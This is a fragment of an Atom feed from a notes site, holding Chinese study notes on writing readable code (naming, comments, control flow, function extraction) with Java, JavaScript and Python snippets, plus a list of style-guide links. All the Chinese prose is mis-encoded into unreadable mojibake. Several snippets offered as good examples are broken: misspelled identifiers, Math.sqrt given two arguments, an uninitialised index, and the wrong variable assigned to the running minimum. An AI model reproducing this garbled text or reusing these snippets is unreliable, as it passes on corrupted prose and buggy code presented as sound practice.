<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>

<h1 id="ä¸€ã€å¯è¯»æ€§çš„é‡è¦æ€§" tabindex="-1"> ä¸€ã€å¯è¯»æ€§çš„é‡è¦æ€§</h1>
<p>ç¼–ç¨‹æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†æ—¶é—´æ˜¯åœ¨é˜…è¯»ä»£ç ï¼Œä¸ä»…è¦é˜…è¯»è‡ªå·±çš„ä»£ç ï¼Œè€Œä¸”è¦é˜…è¯»åˆ«äººçš„ä»£ç ã€‚å› æ­¤ï¼Œå¯è¯»æ€§è‰¯å¥½çš„ä»£ç èƒ½å¤Ÿå¤§å¤§æé«˜ç¼–ç¨‹æ•ˆç‡ã€‚</p>
<p>å¯è¯»æ€§è‰¯å¥½çš„ä»£ç å¾€å¾€ä¼šè®©ä»£ç æ¶æ„æ›´å¥½ï¼Œå› ä¸ºç¨‹åºå‘˜æ›´æ„¿æ„å»ä¿®æ”¹è¿™éƒ¨åˆ†ä»£ç ï¼Œè€Œä¸”ä¹Ÿæ›´å®¹æ˜“ä¿®æ”¹ã€‚</p>
<p>åªæœ‰åœ¨æ ¸å¿ƒé¢†åŸŸä¸ºäº†æ•ˆç‡æ‰å¯ä»¥æ”¾å¼ƒå¯è¯»æ€§ï¼Œå¦åˆ™å¯è¯»æ€§æ˜¯ç¬¬ä¸€ä½ã€‚</p>
<h1 id="äºŒã€ç”¨åå­—è¡¨è¾¾ä»£ç å«ä¹‰" tabindex="-1"> äºŒã€ç”¨åå­—è¡¨è¾¾ä»£ç å«ä¹‰</h1>
<p>ä¸€äº›æ¯”è¾ƒæœ‰è¡¨è¾¾åŠ›çš„å•è¯ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center">å•è¯</th>
<th>å¯æ›¿ä»£å•è¯</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">send</td>
<td>deliverã€dispatchã€announceã€distributeã€route</td>
</tr>
<tr>
<td style="text-align:center">find</td>
<td>searchã€extractã€locateã€recover</td>
</tr>
<tr>
<td style="text-align:center">start</td>
<td>launchã€createã€beginã€open</td>
</tr>
<tr>
<td style="text-align:center">make</td>
<td>createã€set upã€buildã€generateã€composeã€addã€new</td>
</tr>
</tbody>
</table>
<p>ä½¿ç”¨ iã€jã€k ä½œä¸ºå¾ªç¯è¿­ä»£å™¨çš„åå­—è¿‡äºç®€å•ï¼Œuser_iã€member_i è¿™ç§åå­—ä¼šæ›´æœ‰è¡¨è¾¾åŠ›ã€‚å› ä¸ºå¾ªç¯å±‚æ¬¡è¶Šå¤šï¼Œä»£ç è¶Šéš¾ç†è§£ï¼Œæœ‰è¡¨è¾¾åŠ›çš„è¿­ä»£å™¨åå­—å¯è¯»æ€§ä¼šæ›´é«˜ã€‚</p>
<p>ä¸ºåå­—æ·»åŠ å½¢å®¹è¯ç­‰ä¿¡æ¯èƒ½è®©åå­—æ›´å…·æœ‰è¡¨è¾¾åŠ›ï¼Œä½†æ˜¯åå­—ä¹Ÿä¼šå˜é•¿ã€‚åå­—é•¿çŸ­çš„å‡†åˆ™æ˜¯ï¼šä½œç”¨åŸŸè¶Šå¤§ï¼Œåå­—è¶Šé•¿ã€‚å› æ­¤åªæœ‰åœ¨çŸ­ä½œç”¨åŸŸæ‰èƒ½ä½¿ç”¨ä¸€äº›ç®€å•åå­—ã€‚</p>
<h1 id="ä¸‰ã€åå­—ä¸èƒ½å¸¦æ¥æ­§ä¹‰" tabindex="-1"> ä¸‰ã€åå­—ä¸èƒ½å¸¦æ¥æ­§ä¹‰</h1>
<p>èµ·å®Œåå­—è¦æ€è€ƒä¸€ä¸‹åˆ«äººä¼šå¯¹è¿™ä¸ªåå­—æœ‰ä½•è§£è¯»ï¼Œä¼šä¸ä¼šè¯¯è§£äº†åŸæœ¬æƒ³è¡¨è¾¾çš„å«ä¹‰ã€‚</p>
<p>å¸ƒå°”ç›¸å…³çš„å‘½ååŠ ä¸Š isã€canã€shouldã€has ç­‰å‰ç¼€ã€‚</p>
<ul>
<li>ç”¨ minã€max è¡¨ç¤ºæ•°é‡èŒƒå›´ï¼›</li>
<li>ç”¨ firstã€last è¡¨ç¤ºè®¿é—®ç©ºé—´çš„åŒ…å«èŒƒå›´ï¼›</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7d97dde0-0695-4707-bb68-e6c13a2e1b45.png" width="200px"> </div><br>
<ul>
<li>beginã€end è¡¨ç¤ºè®¿é—®ç©ºé—´çš„æ’é™¤èŒƒå›´ï¼Œå³ end ä¸åŒ…å«å°¾éƒ¨ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d85870db-f28c-48c3-9d24-85a36fda5e51.png" width="200px"> </div><br>
<h1 id="å››ã€è‰¯å¥½çš„ä»£ç é£æ ¼" tabindex="-1"> å››ã€è‰¯å¥½çš„ä»£ç é£æ ¼</h1>
<p>é€‚å½“çš„ç©ºè¡Œå’Œç¼©è¿›ã€‚</p>
<p>æ’åˆ—æ•´é½çš„æ³¨é‡Šï¼š</p>
<div><pre><code><span>int</span> a <span>=</span> <span>1</span><span>;</span>   <span>// æ³¨é‡Š</span>
<span>int</span> b <span>=</span> <span>11</span><span>;</span>  <span>// æ³¨é‡Š</span>
<span>int</span> c <span>=</span> <span>111</span><span>;</span> <span>// æ³¨é‡Š</span>
</code></pre></div><p>è¯­å¥é¡ºåºä¸èƒ½éšæ„ï¼Œæ¯”å¦‚ä¸ html è¡¨å•ç›¸å…³è”çš„å˜é‡çš„èµ‹å€¼åº”è¯¥å’Œè¡¨å•åœ¨ html ä¸­çš„é¡ºåºä¸€è‡´ã€‚</p>
<h1 id="äº”ã€ä¸ºä½•ç¼–å†™æ³¨é‡Š" tabindex="-1"> äº”ã€ä¸ºä½•ç¼–å†™æ³¨é‡Š</h1>
<p>é˜…è¯»ä»£ç é¦–å…ˆä¼šæ³¨æ„åˆ°æ³¨é‡Šï¼Œå¦‚æœæ³¨é‡Šæ²¡å¤ªå¤§ä½œç”¨ï¼Œé‚£ä¹ˆå°±ä¼šæµªè´¹ä»£ç é˜…è¯»çš„æ—¶é—´ã€‚é‚£äº›èƒ½ç›´æ¥çœ‹å‡ºå«ä¹‰çš„ä»£ç ä¸éœ€è¦å†™æ³¨é‡Šï¼Œç‰¹åˆ«æ˜¯ä¸éœ€è¦ä¸ºæ¯ä¸ªæ–¹æ³•éƒ½åŠ ä¸Šæ³¨é‡Šï¼Œæ¯”å¦‚é‚£äº›ç®€å•çš„ getter å’Œ setter æ–¹æ³•ï¼Œä¸ºè¿™äº›æ–¹æ³•å†™æ³¨é‡Šåè€Œè®©ä»£ç å¯è¯»æ€§æ›´å·®ã€‚</p>
<p>ä¸èƒ½å› ä¸ºæœ‰æ³¨é‡Šå°±éšä¾¿èµ·ä¸ªåå­—ï¼Œè€Œæ˜¯äº‰å–èµ·ä¸ªå¥½åå­—è€Œä¸å†™æ³¨é‡Šã€‚</p>
<p>å¯ä»¥ç”¨æ³¨é‡Šæ¥è®°å½•é‡‡ç”¨å½“å‰è§£å†³åŠæ³•çš„æ€è€ƒè¿‡ç¨‹ï¼Œä»è€Œè®©è¯»è€…æ›´å®¹æ˜“ç†è§£ä»£ç ã€‚</p>
<p>æ³¨é‡Šç”¨æ¥æé†’ä¸€äº›ç‰¹æ®Šæƒ…å†µã€‚</p>
<p>ç”¨ TODO ç­‰åšæ ‡è®°ï¼š</p>
<table>
<thead>
<tr>
<th>æ ‡è®°</th>
<th>ç”¨æ³•</th>
</tr>
</thead>
<tbody>
<tr>
<td>TODO</td>
<td>å¾…åš</td>
</tr>
<tr>
<td>FIXME</td>
<td>å¾…ä¿®å¤</td>
</tr>
<tr>
<td>HACK</td>
<td>ç²—ç³™çš„è§£å†³æ–¹æ¡ˆ</td>
</tr>
<tr>
<td>XXX</td>
<td>å±é™©ï¼è¿™é‡Œæœ‰é‡è¦çš„é—®é¢˜</td>
</tr>
</tbody>
</table>
<h1 id="å…­ã€å¦‚ä½•ç¼–å†™æ³¨é‡Š" tabindex="-1"> å…­ã€å¦‚ä½•ç¼–å†™æ³¨é‡Š</h1>
<p>å°½é‡ç®€æ´æ˜äº†ï¼š</p>
<div><pre><code><span>// The first String is student's name</span>
<span>// The Second Integer is student's score</span>
<span>Map</span><span><span>&lt;</span><span>String</span><span>,</span> <span>Integer</span><span>></span></span> scoreMap <span>=</span> <span>new</span> <span>HashMap</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>
</code></pre></div><div><pre><code><span>// Student's name -> Student's score</span>
<span>Map</span><span><span>&lt;</span><span>String</span><span>,</span> <span>Integer</span><span>></span></span> scoreMap <span>=</span> <span>new</span> <span>HashMap</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>
</code></pre></div><p>æ·»åŠ æµ‹è¯•ç”¨ä¾‹æ¥è¯´æ˜ï¼š</p>
<div><pre><code><span>// ...</span>
<span>// Example: add(1, 2), return 3</span>
<span>int</span> <span>add</span><span>(</span><span>int</span> x<span>,</span> <span>int</span> y<span>)</span> <span>{</span>
    <span>return</span> x <span>+</span> y<span>;</span>
<span>}</span>
</code></pre></div><p>ä½¿ç”¨ä¸“ä¸šåè¯æ¥ç¼©çŸ­æ¦‚å¿µä¸Šçš„è§£é‡Šï¼Œæ¯”å¦‚ç”¨è®¾è®¡æ¨¡å¼åæ¥è¯´æ˜ä»£ç ã€‚</p>
<h1 id="ä¸ƒã€æé«˜æ§åˆ¶æµçš„å¯è¯»æ€§" tabindex="-1"> ä¸ƒã€æé«˜æ§åˆ¶æµçš„å¯è¯»æ€§</h1>
<p>æ¡ä»¶è¡¨è¾¾å¼ä¸­ï¼Œå·¦ä¾§æ˜¯å˜é‡ï¼Œå³ä¾§æ˜¯å¸¸æ•°ã€‚æ¯”å¦‚ä¸‹é¢ç¬¬ä¸€ä¸ªè¯­å¥æ­£ç¡®ï¼š</p>
<div><pre><code><span>if</span> <span>(</span>len <span>&lt;</span> <span>10</span><span>)</span>
<span>if</span> <span>(</span><span>10</span> <span>></span> len<span>)</span>
</code></pre></div><p>åªæœ‰åœ¨é€»è¾‘ç®€å•çš„æƒ…å†µä¸‹ä½¿ç”¨ ? : ä¸‰ç›®è¿ç®—ç¬¦æ¥ä½¿ä»£ç æ›´ç´§å‡‘ï¼Œå¦åˆ™åº”è¯¥æ‹†åˆ†æˆ if / elseï¼›</p>
<p>do / while çš„æ¡ä»¶æ”¾åœ¨åé¢ï¼Œä¸å¤Ÿç®€å•æ˜äº†ï¼Œå¹¶ä¸”ä¼šæœ‰ä¸€äº›è¿·æƒ‘çš„åœ°æ–¹ï¼Œæœ€å¥½ä½¿ç”¨ while æ¥ä»£æ›¿ã€‚</p>
<p>å¦‚æœåªæœ‰ä¸€ä¸ª goto ç›®æ ‡ï¼Œé‚£ä¹ˆ goto å°šä¸”è¿˜èƒ½æ¥å—ï¼Œä½†æ˜¯è¿‡äºå¤æ‚çš„ goto ä¼šè®©ä»£ç å¯è¯»æ€§ç‰¹åˆ«å·®ï¼Œåº”è¯¥é¿å…ä½¿ç”¨ gotoã€‚</p>
<p>åœ¨åµŒå¥—çš„å¾ªç¯ä¸­ï¼Œç”¨ä¸€äº› return è¯­å¥å¾€å¾€èƒ½å‡å°‘åµŒå¥—çš„å±‚æ•°ã€‚</p>
<h1 id="å…«ã€æ‹†åˆ†é•¿è¡¨è¾¾å¼" tabindex="-1"> å…«ã€æ‹†åˆ†é•¿è¡¨è¾¾å¼</h1>
<p>é•¿è¡¨è¾¾å¼çš„å¯è¯»æ€§å¾ˆå·®ï¼Œå¯ä»¥å¼•å…¥ä¸€äº›è§£é‡Šå˜é‡ä»è€Œæ‹†åˆ†è¡¨è¾¾å¼ï¼š</p>
<div><pre><code><span>if</span> line<span>.</span>split<span>(</span><span>':'</span><span>)</span><span>[</span><span>0</span><span>]</span><span>.</span>strip<span>(</span><span>)</span> <span>==</span> <span>"root"</span><span>:</span>
    <span>.</span><span>.</span><span>.</span>
</code></pre></div><div><pre><code>username <span>=</span> line<span>.</span>split<span>(</span><span>':'</span><span>)</span><span>[</span><span>0</span><span>]</span><span>.</span>strip<span>(</span><span>)</span>
<span>if</span> username <span>==</span> <span>"root"</span><span>:</span>
    <span>.</span><span>.</span><span>.</span>
</code></pre></div><p>ä½¿ç”¨æ‘©æ ¹å®šç†ç®€åŒ–ä¸€äº›é€»è¾‘è¡¨è¾¾å¼ï¼š</p>
<div><pre><code><span>if</span> <span>(</span><span>!</span>a <span>&amp;&amp;</span> <span>!</span>b<span>)</span> <span>{</span>
    <span>.</span><span>.</span><span>.</span>
<span>}</span>
</code></pre></div><div><pre><code><span>if</span> <span>(</span><span>!</span><span>(</span>a <span>||</span> b<span>)</span><span>)</span> <span>{</span>
    <span>.</span><span>.</span><span>.</span>
<span>}</span>
</code></pre></div><h1 id="ä¹ã€å˜é‡ä¸å¯è¯»æ€§" tabindex="-1"> ä¹ã€å˜é‡ä¸å¯è¯»æ€§</h1>
<p><strong>å»é™¤æ§åˆ¶æµå˜é‡</strong> ã€‚åœ¨å¾ªç¯ä¸­é€šè¿‡ä½¿ç”¨ break æˆ–è€… return å¯ä»¥å‡å°‘æ§åˆ¶æµå˜é‡çš„ä½¿ç”¨ã€‚</p>
<div><pre><code><span>boolean</span> done <span>=</span> <span>false</span><span>;</span>
<span>while</span> <span>(</span><span>/* condition */</span> <span>&amp;&amp;</span> <span>!</span>done<span>)</span> <span>{</span>
    <span>.</span><span>.</span><span>.</span>
    <span>if</span> <span>(</span> <span>.</span><span>.</span><span>.</span> <span>)</span> <span>{</span>
        done <span>=</span> <span>true</span><span>;</span>
        <span>continue</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>while</span><span>(</span><span>/* condition */</span><span>)</span> <span>{</span>
    <span>.</span><span>.</span><span>.</span>
    <span>if</span> <span>(</span> <span>.</span><span>.</span><span>.</span> <span>)</span> <span>{</span>
        <span>break</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><p><strong>å‡å°å˜é‡ä½œç”¨åŸŸ</strong> ã€‚ä½œç”¨åŸŸè¶Šå°ï¼Œè¶Šå®¹æ˜“å®šä½åˆ°å˜é‡æ‰€æœ‰ä½¿ç”¨çš„åœ°æ–¹ã€‚</p>
<p>JavaScript å¯ä»¥ç”¨é—­åŒ…å‡å°ä½œç”¨åŸŸã€‚ä»¥ä¸‹ä»£ç ä¸­ submit_form æ˜¯å‡½æ•°å˜é‡ï¼Œsubmitted å˜é‡æ§åˆ¶å‡½æ•°ä¸ä¼šè¢«æäº¤ä¸¤æ¬¡ã€‚ç¬¬ä¸€ä¸ªå®ç°ä¸­ submitted æ˜¯å…¨å±€å˜é‡ï¼Œç¬¬äºŒä¸ªå®ç°æŠŠ submitted æ”¾åˆ°åŒ¿åå‡½æ•°ä¸­ï¼Œä»è€Œé™åˆ¶äº†èµ·ä½œç”¨åŸŸèŒƒå›´ã€‚</p>
<div><pre><code>submitted <span>=</span> <span>false</span><span>;</span>
<span>var</span> <span>submit_form</span> <span>=</span> <span>function</span><span>(</span><span>form_name</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>submitted<span>)</span> <span>{</span>
        <span>return</span><span>;</span>
    <span>}</span>
    submitted <span>=</span> <span>true</span><span>;</span>
<span>}</span><span>;</span>
</code></pre></div><div><pre><code><span>var</span> submit_form <span>=</span> <span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>var</span> submitted <span>=</span> <span>false</span><span>;</span>
    <span>return</span> <span>function</span><span>(</span><span>form_name</span><span>)</span> <span>{</span>
        <span>if</span><span>(</span>submitted<span>)</span> <span>{</span>
            <span>return</span><span>;</span>
        <span>}</span>
        submitted <span>=</span> <span>true</span><span>;</span>
    <span>}</span>
<span>}</span><span>(</span><span>)</span><span>)</span><span>;</span>  <span>// () ä½¿å¾—å¤–å±‚åŒ¿åå‡½æ•°ç«‹å³æ‰§è¡Œ</span>
</code></pre></div><p>JavaScript ä¸­æ²¡æœ‰ç”¨ var å£°æ˜çš„å˜é‡éƒ½æ˜¯å…¨å±€å˜é‡ï¼Œè€Œå…¨å±€å˜é‡å¾ˆå®¹æ˜“é€ æˆè¿·æƒ‘ï¼Œå› æ­¤åº”å½“æ€»æ˜¯ç”¨ var æ¥å£°æ˜å˜é‡ã€‚</p>
<p>å˜é‡å®šä¹‰çš„ä½ç½®åº”å½“ç¦»å®ƒä½¿ç”¨çš„ä½ç½®æœ€è¿‘ã€‚</p>
<p><strong>å®ä¾‹è§£æ</strong></p>
<p>åœ¨ä¸€ä¸ªç½‘é¡µä¸­æœ‰ä»¥ä¸‹æ–‡æœ¬è¾“å…¥å­—æ®µï¼š</p>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span> <span><span>=</span> <span>"</span>text<span>"</span></span> <span>id</span> <span><span>=</span> <span>"</span>input1<span>"</span></span> <span>value</span> <span><span>=</span> <span>"</span>a<span>"</span></span><span>></span></span>
<span><span><span>&lt;</span>input</span> <span>type</span> <span><span>=</span> <span>"</span>text<span>"</span></span> <span>id</span> <span><span>=</span> <span>"</span>input2<span>"</span></span> <span>value</span> <span><span>=</span> <span>"</span>b<span>"</span></span><span>></span></span>
<span><span><span>&lt;</span>input</span> <span>type</span> <span><span>=</span> <span>"</span>text<span>"</span></span> <span>id</span> <span><span>=</span> <span>"</span>input3<span>"</span></span> <span>value</span> <span><span>=</span> <span>"</span><span>"</span></span><span>></span></span>
<span><span><span>&lt;</span>input</span> <span>type</span> <span><span>=</span> <span>"</span>text<span>"</span></span> <span>id</span> <span><span>=</span> <span>"</span>input4<span>"</span></span> <span>value</span> <span><span>=</span> <span>"</span>d<span>"</span></span><span>></span></span>
</code></pre></div><p>ç°åœ¨è¦æ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²å¹¶æŠŠå®ƒæ”¾åˆ°ç¬¬ä¸€ä¸ªç©ºçš„ input å­—æ®µä¸­ï¼Œåˆå§‹å®ç°å¦‚ä¸‹ï¼š</p>
<div><pre><code><span>var</span> <span>setFirstEmptyInput</span> <span>=</span> <span>function</span><span>(</span><span>new_alue</span><span>)</span> <span>{</span>
    <span>var</span> found <span>=</span> <span>false</span><span>;</span>
    <span>var</span> i <span>=</span> <span>1</span><span>;</span>
    <span>var</span> elem <span>=</span> document<span>.</span><span>getElementById</span><span>(</span><span>'input'</span> <span>+</span> i<span>)</span><span>;</span>
    <span>while</span> <span>(</span>elem <span>!=</span> <span>null</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span>elem<span>.</span>value <span>===</span> <span>''</span><span>)</span> <span>{</span>
            found <span>=</span> <span>true</span><span>;</span>
            <span>break</span><span>;</span>
        <span>}</span>
        i<span>++</span><span>;</span>
        elem <span>=</span> document<span>.</span><span>getElementById</span><span>(</span><span>'input'</span> <span>+</span> i<span>)</span><span>;</span>
    <span>}</span>
    <span>if</span> <span>(</span>found<span>)</span> elem<span>.</span>value <span>=</span> new_value<span>;</span>
    <span>return</span> elem<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><p>ä»¥ä¸Šå®ç°æœ‰ä»¥ä¸‹é—®é¢˜ï¼š</p>
<ul>
<li>found å¯ä»¥å»é™¤ï¼›</li>
<li>elem ä½œç”¨åŸŸè¿‡å¤§ï¼›</li>
<li>å¯ä»¥ç”¨ for å¾ªç¯ä»£æ›¿ while å¾ªç¯ï¼›</li>
</ul>
<div><pre><code><span>var</span> <span>setFirstEmptyInput</span> <span>=</span> <span>function</span><span>(</span><span>new_value</span><span>)</span> <span>{</span>
    <span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>1</span><span>;</span> <span>true</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
        <span>var</span> elem <span>=</span> document<span>.</span><span>getElementById</span><span>(</span><span>'input'</span> <span>+</span> i<span>)</span><span>;</span>
        <span>if</span> <span>(</span>elem <span>===</span> <span>null</span><span>)</span> <span>{</span>
            <span>return</span> <span>null</span><span>;</span>
        <span>}</span>
        <span>if</span> <span>(</span>elem<span>.</span>value <span>===</span> <span>''</span><span>)</span> <span>{</span>
            elem<span>.</span>value <span>=</span> new_value<span>;</span>
            <span>return</span> elem<span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h1 id="åã€æŠ½å–å‡½æ•°" tabindex="-1"> åã€æŠ½å–å‡½æ•°</h1>
<p>å·¥ç¨‹å­¦å°±æ˜¯æŠŠå¤§é—®é¢˜æ‹†åˆ†æˆå°é—®é¢˜å†æŠŠè¿™äº›é—®é¢˜çš„è§£å†³æ–¹æ¡ˆæ”¾å›ä¸€èµ·ã€‚</p>
<p>é¦–å…ˆåº”è¯¥æ˜ç¡®ä¸€ä¸ªå‡½æ•°çš„é«˜å±‚æ¬¡ç›®æ ‡ï¼Œç„¶åå¯¹äºä¸æ˜¯ç›´æ¥ä¸ºäº†è¿™ä¸ªç›®æ ‡å·¥ä½œçš„ä»£ç ï¼ŒæŠ½å–å‡ºæ¥æ”¾åˆ°ç‹¬ç«‹çš„å‡½æ•°ä¸­ã€‚</p>
<p>ä»‹ç»æ€§çš„ä»£ç ï¼š</p>
<div><pre><code><span>int</span> <span>findClostElement</span><span>(</span><span>int</span><span>[</span><span>]</span> arr<span>)</span> <span>{</span>
    <span>int</span> clostIdx<span>;</span>
    <span>int</span> clostDist <span>=</span> <span>Interger</span><span>.</span>MAX_VALUE<span>;</span>
    <span>for</span> <span>(</span><span>int</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> arr<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
        <span>int</span> x <span>=</span> <span>.</span><span>.</span><span>.</span><span>;</span>
        <span>int</span> y <span>=</span> <span>.</span><span>.</span><span>.</span><span>;</span>
        <span>int</span> z <span>=</span> <span>.</span><span>.</span><span>.</span><span>;</span>
        <span>int</span> value <span>=</span> x <span>*</span> y <span>*</span> z<span>;</span>
        <span>int</span> dist <span>=</span> <span>Math</span><span>.</span><span>sqrt</span><span>(</span><span>Math</span><span>.</span><span>pow</span><span>(</span>value<span>,</span> <span>2</span><span>)</span><span>,</span> <span>Math</span><span>.</span><span>pow</span><span>(</span>arr<span>[</span>i<span>]</span><span>,</span> <span>2</span><span>)</span><span>)</span><span>;</span>
        <span>if</span> <span>(</span>dist <span>&lt;</span> clostDist<span>)</span> <span>{</span>
            clostIdx <span>=</span> i<span>;</span>
            clostDist <span>=</span> value<span>;</span>
        <span>}</span>
    <span>}</span>
    <span>return</span> clostIdx<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><p>ä»¥ä¸Šä»£ç ä¸­å¾ªç¯éƒ¨åˆ†ä¸»è¦è®¡ç®—è·ç¦»ï¼Œè¿™éƒ¨åˆ†ä¸å±äºä»£ç é«˜å±‚æ¬¡ç›®æ ‡ï¼Œé«˜å±‚æ¬¡ç›®æ ‡æ˜¯å¯»æ‰¾æœ€å°è·ç¦»çš„å€¼ï¼Œå› æ­¤å¯ä»¥æŠŠè¿™éƒ¨åˆ†ä»£æ›¿æå–åˆ°ç‹¬ç«‹çš„å‡½æ•°ä¸­ã€‚è¿™æ ·åšä¹Ÿå¸¦æ¥ä¸€ä¸ªé¢å¤–çš„å¥½å¤„æœ‰ï¼šå¯ä»¥å•ç‹¬è¿›è¡Œæµ‹è¯•ã€å¯ä»¥å¿«é€Ÿæ‰¾åˆ°ç¨‹åºé”™è¯¯å¹¶ä¿®æ”¹ã€‚</p>
<div><pre><code><span>public</span> <span>int</span> <span>findClostElement</span><span>(</span><span>int</span><span>[</span><span>]</span> arr<span>)</span> <span>{</span>
    <span>int</span> clostIdx<span>;</span>
    <span>int</span> clostDist <span>=</span> <span>Interger</span><span>.</span>MAX_VALUE<span>;</span>
    <span>for</span> <span>(</span><span>int</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> arr<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
        <span>int</span> dist <span>=</span> <span>computDist</span><span>(</span>arr<span>,</span> i<span>)</span><span>;</span>
        <span>if</span> <span>(</span>dist <span>&lt;</span> clostDist<span>)</span> <span>{</span>
            clostIdx <span>=</span> i<span>;</span>
            clostDist <span>=</span> value<span>;</span>
        <span>}</span>
    <span>}</span>
    <span>return</span> clostIdx<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><p>å¹¶ä¸æ˜¯å‡½æ•°æŠ½å–çš„è¶Šå¤šè¶Šå¥½ï¼Œå¦‚æœæŠ½å–è¿‡å¤šï¼Œåœ¨é˜…è¯»ä»£ç çš„æ—¶å€™å¯èƒ½éœ€è¦ä¸æ–­è·³æ¥è·³å»ã€‚åªæœ‰åœ¨å½“å‰å‡½æ•°ä¸éœ€è¦å»äº†è§£æŸä¸€å—ä»£ç ç»†èŠ‚è€Œèƒ½å¤Ÿè¡¨è¾¾å…¶å†…å®¹æ—¶ï¼ŒæŠŠè¿™å—ä»£ç æŠ½å–æˆå­å‡½æ•°æ‰æ˜¯å¥½çš„ã€‚</p>
<p>å‡½æ•°æŠ½å–ä¹Ÿç”¨äºå‡å°ä»£ç çš„å†—ä½™ã€‚</p>
<h1 id="åä¸€ã€ä¸€æ¬¡åªåšä¸€ä»¶äº‹" tabindex="-1"> åä¸€ã€ä¸€æ¬¡åªåšä¸€ä»¶äº‹</h1>
<p>åªåšä¸€ä»¶äº‹çš„ä»£ç å¾ˆå®¹æ˜“è®©äººçŸ¥é“å…¶è¦åšçš„äº‹ï¼›</p>
<p>åŸºæœ¬æµç¨‹ï¼šåˆ—å‡ºä»£ç æ‰€åšçš„æ‰€æœ‰ä»»åŠ¡ï¼›æŠŠæ¯ä¸ªä»»åŠ¡æ‹†åˆ†åˆ°ä¸åŒçš„å‡½æ•°ï¼Œæˆ–è€…ä¸åŒçš„æ®µè½ã€‚</p>
<h1 id="åäºŒã€ç”¨è‡ªç„¶è¯­è¨€è¡¨è¿°ä»£ç " tabindex="-1"> åäºŒã€ç”¨è‡ªç„¶è¯­è¨€è¡¨è¿°ä»£ç </h1>
<p>å…ˆç”¨è‡ªç„¶è¯­è¨€ä¹¦å†™ä»£ç é€»è¾‘ï¼Œä¹Ÿå°±æ˜¯ä¼ªä»£ç ï¼Œç„¶åå†å†™ä»£ç ï¼Œè¿™æ ·ä»£ç é€»è¾‘ä¼šæ›´æ¸…æ™°ã€‚</p>
<h1 id="åä¸‰ã€å‡å°‘ä»£ç é‡" tabindex="-1"> åä¸‰ã€å‡å°‘ä»£ç é‡</h1>
<p>ä¸è¦è¿‡åº¦è®¾è®¡ï¼Œç¼–ç è¿‡ç¨‹ä¼šæœ‰å¾ˆå¤šå˜åŒ–ï¼Œè¿‡åº¦è®¾è®¡çš„å†…å®¹åˆ°æœ€åå¾€å¾€æ˜¯æ— ç”¨çš„ã€‚</p>
<p>å¤šç”¨æ ‡å‡†åº“å®ç°ã€‚</p>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li>Dustin, Boswell, Trevor, ç­‰. ç¼–å†™å¯è¯»ä»£ç çš„è‰ºæœ¯ [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2012.</li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä»£ç é£æ ¼è§„èŒƒ</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F/%E4%BB%A3%E7%A0%81%E9%A3%8E%E6%A0%BC%E8%A7%84%E8%8C%83.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F/%E4%BB%A3%E7%A0%81%E9%A3%8E%E6%A0%BC%E8%A7%84%E8%8C%83.html"/>
    <updated>2022-05-16T11:59:04.000Z</updated>
    <content type="html"><![CDATA[

<ul>
<li><a href="https://github.com/twitter/commons/blob/master/src/java/com/twitter/common/styleguide.md" target="_blank" rel="noopener noreferrer">Twitter Java Style Guide</a></li>
<li><a href="http://google.github.io/styleguide/javaguide.html" target="_blank" rel="noopener noreferrer">Google Java Style Guide</a></li>
<li><a href="https://github.com/alibaba/p3c" target="_blank" rel="noopener noreferrer">é˜¿é‡Œå·´å·´Javaå¼€å‘æ‰‹å†Œ</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä¸€ã€å¸¸ç”¨æ“ä½œä»¥åŠæ¦‚å¿µ</title>
